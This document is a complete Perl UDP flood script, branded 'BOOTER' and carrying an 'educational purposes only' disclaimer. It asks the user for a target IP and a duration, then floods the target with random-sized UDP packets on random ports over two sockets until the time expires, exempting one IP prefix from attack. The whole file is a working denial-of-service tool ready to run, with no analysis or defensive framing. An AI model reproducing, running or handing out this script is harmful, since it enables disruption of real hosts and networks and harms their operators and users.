#!/usr/bin/perl

##############
# udp flood test for educational purposes only!!
##############

use Socket;

print " _____  _____  _____  _____  ____  _____  \n";
print "|  _  ||  _  ||  _  ||_   _||  __||  _  | \n";
print "| |_} || | | || | | |  | |  | |_  | |_} | \n";
print "|  _ < | | | || | | |  | |  |  _| |  _ <  \n";
print "| |_} || |_| || |_| |  | |  | |__ | | | | \n";
print "|_____||_____||_____|  |_|  |____||_| |_| \n";
print "                              Made By R4. \n";
print "  \n";
print " Made For Educational Purposes Only! \n";
print "  \n";
print " Program Initialized.... Input Commands! \n";
print "  \n";

print "What IP? : ";
$ip = <stdin>;
chop ($ip);


unless ($ip) {
  print " Program Ended, You Must Specify A IP!!\n";
  exit(0);
}

$ip2 = $ip;
$port = 0;
$size = 0;

print "How Many Seconds?(30-9999) : ";
$time = <stdin>;
chop ($time);

unless ($time) {
    $time = 300;
}

if ($time > 9999) {
    $time = 600;
}


$pos = index(" " . $ip, "47.72.");
if($pos eq "-1") {

} else {
  print "+---IP IS SAFELISTED---+\n";
  exit(0);
}

my ($iaddr,$iaddr2,$endtime,$psize,$pport,$keepalive,$alivecount);

$iaddr = inet_aton("$ip") or die " Cannot resolve hostname $ip\n";
$iaddr2 = inet_aton("$ip2") or die " Cannot resolve hostname $ip2\n";
$endtime = time() + ($time ? $time : 9999);
$keepalive = 0;
$alivecount = 0;

socket(flood, PF_INET, SOCK_DGRAM, 17);
socket(flood2, PF_INET, SOCK_DGRAM, 17);

# The Beautiful Display
print "+----------------------------------+\n";
print " Destination IP: $ip\n";
# Is the destination port random, or targeted?
if($port eq "0") {
  print " Destination Port: Random Ports\n";
} else {
  print " Destination Port: $port\n";
}
if($size eq "0") {
  print " Packet Size: Random 64-128 Bytes\n";
} else {
  print " Packet Size: $size\n";
}
print " Time: $time Seconds\n";
print "+----------------------------------+\n";
print " Manually Stop Early At Any Time With Ctrl-C\n";

for (;time() <= $endtime;) {

$alivecount = $alivecount+1;
if ($alivecount > 4000000) {
    $alivecount = 0;
    $keepalive = $keepalive+4000000;
    print "++$keepalive Hits Sent++\n";
}

  $psize = $size ? $size : int(rand(128-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("A$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  send(flood2, pack("a$psize","flood2"), 0, pack_sockaddr_in($pport, $iaddr2));

}

print " All done, $time seconds complete!\n";
